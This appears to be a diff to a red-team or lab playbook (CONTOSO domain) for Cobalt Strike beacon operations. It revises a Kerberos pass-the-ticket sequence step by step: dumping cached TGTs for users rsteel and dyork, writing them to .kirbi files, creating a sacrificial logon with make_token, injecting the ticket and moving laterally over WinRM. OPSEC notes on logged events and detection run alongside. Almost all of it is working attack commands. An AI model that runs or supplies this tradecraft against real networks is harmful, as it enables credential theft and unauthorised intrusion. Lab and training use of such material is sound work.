@@ -42,20 +42,30 @@ beacon> rev2self                       // drop token on original beacon after ju
 **Option B — TGT injection (if rsteel TGT is cached on this host)** `OPSEC-🟢SAFE` dump / `OPSEC-🟠CAUTION` make_token
 
 ```cs
-beacon> krb_triage                             // confirm rsteel TGT is cached
-beacon> krb_dump /user:rsteel /service:krbtgt  // BOF — Kerberos API, no raw LSASS read
-// Copy the base64 blob from beacon output
-
-beacon> make_token CONTOSO\rsteel FakePass     // Type 9 logon session — Event 4648 logged
-                                               // password is irrelevant, ticket overrides cred
+// Step 1 — confirm rsteel TGT is cached and dump it
+beacon> krb_triage
+beacon> krb_dump /user:rsteel /service:krbtgt  // copy the base64 blob from output
 ```
 
->Powershell: `[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String(<krb_dump base64 TGT value>))`
-
->beacon>  
+```powershell
+# Step 2 — Attacker Windows box PowerShell (NOT in beacon — path is on CS client machine)
+# Paste the full base64 blob from krb_dump as a single unbroken string
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<base64 from krb_dump>"))
+```
 
 ```cs
-beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi  // inject TGT file in-memory — no disk write
+// Step 3 — make_token MUST come before kerberos_ticket_use
+// Beacon running as SYSTEM has no Kerberos user logon session — ticket injection fails with
+// "Failed to use ticket: 0" unless a user logon session exists first.
+// kerberos_ticket_use injects the TGT into the Type 9 session created by make_token.
+beacon> make_token CONTOSO\rsteel FakePass     // OPSEC-🟠CAUTION — Event 4648 logged
+                                               // password is irrelevant — ticket overrides cred
+
+// Step 4 — kerberos_ticket_use requires a .kirbi FILE PATH — inline base64 is NOT supported
+// CS treats bare base64 as a filename and returns "does not exist" error
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
+
+// Step 5 — lateral move using rsteel's Kerberos context
 beacon> jump winrm64 lon-ws-1 smb
 beacon> rev2self
 ```
@@ -109,13 +119,19 @@ On the new Beacon on *lon-ws-1*:
 
 > dyork's TGT base64 blob is in your beacon output from step 3. It does **not** need to be written to disk.
 
+```powershell
+# Attacker Windows box PowerShell — convert krb_dump base64 output to .kirbi file
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\dyork.kirbi", [Convert]::FromBase64String("<base64 from krb_dump>"))
+```
+
 ```cs
 // Create a sacrificial logon session to inject into — password is irrelevant
 beacon> make_token CONTOSO\dyork FakePass        // OPSEC-🟠CAUTION — Event 4648 logged
                                                  // Type 9 logon (network only) — no interactive session created
 
-// Inject the TGT into current beacon token context
-beacon> kerberos_ticket_use <base64-dyork-tgt>  // OPSEC-🟢SAFE — in-memory injection, no disk write
+// kerberos_ticket_use requires a .kirbi FILE PATH — inline base64 not supported in this CS version
+// CS treats bare base64 as a filename and returns "does not exist" error
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\dyork.kirbi  // OPSEC-🟢SAFE — reads file from CS client, injects in-memory
 
 // Confirm ticket loaded
 beacon> run klist                                // OPSEC-🟠CAUTION — spawns klist.exe child process
